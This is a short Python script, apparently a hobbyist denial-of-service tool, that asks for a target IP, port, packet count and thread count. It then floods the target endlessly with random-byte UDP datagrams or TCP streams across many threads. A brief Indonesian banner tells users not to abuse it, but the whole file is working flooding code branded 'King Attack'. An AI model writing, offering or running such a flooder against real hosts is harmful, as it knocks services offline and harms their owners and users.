import random
import socket
import threading
import os, sys
import time

os.system("clear")
time.sleep(3)
print('''\033[1;31;40m''')
time.sleep(2)
print("============ ⚠ WARNING ⚠ =============")
print(" JANGAN ABUSE, GUNAKAN UNTUK KEBAIKAN ") 
print("============ ⚠ WARNING ⚠ =============") 

choice = str(input("\033[1;36;40m King Attack Now (Udp/Tcp) \033[1;31;40m==> "))
ip = str(input("\033[1;36;40m IP Target \033[1;31;40m==> "))
port = int(input("\033[1;36;40m Port Target \033[1;31;40m==> "))
times = int(input("\033[1;36;40m Send Packets \033[1;31;40m==> "))
threads = int(input("\033[1;36;40m Send Threads \033[1;31;40m==> "))
time.sleep(1)
os.system("clear")

def udp():
  data = random._urandom(1050)
  while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                        s.sendto(data,addr)
                print("\033[1;31;40 King Attack Now Ip %s Port %s."%(ip,port))
        except:
                print("\033[1;36;40 King Community!!!")

def tcp():
  data = random._urandom(202400)
  while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(times):
                        s.send(data)
                        s.send(data)
                        s.send(data)
        except:
                s.close()
                print("\033[1;31;40m King Attack Now Ip %s Port %s."%(ip,port))

for y in range(threads):
  if choice == 'Udp':
        th = threading.Thread(target = udp)
        th.start()
  elif choice == 'Tcp':
        th = threading.Thread(target = tcp)
        th.start()
